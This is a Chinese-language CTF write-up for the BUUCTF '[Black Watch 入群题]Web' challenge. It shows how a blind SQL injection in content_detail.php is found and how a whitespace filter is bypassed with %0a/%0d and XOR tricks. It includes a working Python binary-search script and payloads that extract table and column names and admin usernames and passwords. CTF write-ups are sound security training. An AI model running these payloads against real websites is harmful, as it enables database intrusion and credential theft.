# [Black Watch 入群题]Web

## 题目信息

![image-20210813190549093](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210813190549093.png)

## 解题思路

进去是这个页面

![image-20210813190632664](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210813190632664.png)

访问后没看出有特殊地方。抓包发现两个php文件

![image-20210813190825410](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210813190825410.png)

![image-20210813190836379](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210813190836379.png)

猜测content_detail.php存在sql注入

![image-20210813190935519](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210813190935519.png)

果然如此。题目考点在这。若不是数字型注入，那试下字符型注入

**失败合集** 👇

![image-20210813191158621](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210813191158621.png)

![image-20210813191217144](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210813191217144.png)

![image-20210813191231865](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210813191231865.png)

![image-20210813191243015](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210813191243015.png)

![image-20210813191301613](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210813191301613.png)

最后发现不能有空格，不然就被过滤

![image-20210813191459404](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210813191459404.png)

最后没想到这么简单就绕过了。参考别人wp。发现两种方法，一种是异或，另外一种是换行符(0a)绕过

### 方法1：0a绕过

![image-20210816134055497](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210816134055497.png)

运用布尔注入编写payload

```sql
id=0%0dOR%0dascii(substr((version()),1,1))=ASCII('1')
```

![image-20210816145043992](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210816145043992.png)

> 注意mysql的substr是从1开始的

#### 二分法脚本

```python
# coding=UTF-8
import requests
import time

def active(seat):
    # seat：payload中的第几位flag  。  times：二分法执行的次数
    global url, payload, flag
    min_value = 33
    max_value = 130
    while True:
        mid = (min_value + max_value) // 2  # 中值
        whole_payload = url + payload.format(seat, mid)  # 最终payload
        res = requests.get(whole_payload)
        time.sleep(0.1)
       # print(whole_payload)
        if flag in res.text:
            min_value = mid + 1
        else:
            max_value = mid

        if min_value == max_value:
            return min_value

if __name__ == '__main__':
    flag = "title"
    url = r"http://f1497bc2-20a1-40aa-ab35-c49dc8b1ced3.node4.buuoj.cn:81/backend/content_detail.php?id="
    payload1 = r"0 or ascii(substr((select group_concat(table_name) from information_schema.tables" \
           " where table_schema=database()),{},1))>{}".replace(' ', '%0a')
    payload2 = r"0 or ascii(substr((select group_concat(column_name) from information_schema.columns" \
           " where table_name='admin'),{},1))>{}".replace(' ', '%0a')
    payload3 = r"0 or ascii(substr((select group_concat(username) from admin),{},1))>{}".replace(' ', '%0a')
    payload4 = r"0 or ascii(substr((select group_concat(password) from admin),{},1))>{}".replace(' ', '%0a')
    payload = payload4
    print('result is : \n')
    for i in range(1,20):
        CH = chr(active(i))
        if CH == '!':
            CH = chr(active(i+1))
            if CH == '!':
                exit(1)

        print(CH, end='')

```

第一个账户登录失败，第二个登录成功！

![image-20210816172228868](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210816172228868.png)



### 方法2：异或绕过

原理，

```sql
mysql> select xxx from xxx where id = 1^1 //都是true，相同异或为0。相反则为1。
```

![image-20210816172731495](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210816172731495.png)

>因为user = "root"^0 (异或为1)，查询语句变成user = 1。故爆出所有数据

令一边为0，这样只要右边为1，此时异或后为1，查出数据。

```python
payload1 = '0^(ascii(substr((select(database())),{},1))>{})'
    payload2 = '0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\'news\')),{},1))>{})'
    payload3 = '0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\'contents\')),{},1))>{})'
    payload4 = '0^(ascii(substr((select(group_concat(password))from(admin)),{},1))>{})'
```

脚本成功运行！得到两个账号的密码

![image-20210816174201530](C:\Users\Th\Desktop\19Grade_CTFSummerTraining\8月12日第七次提交\Throokie\Web.assets\image-20210816174201530.png)

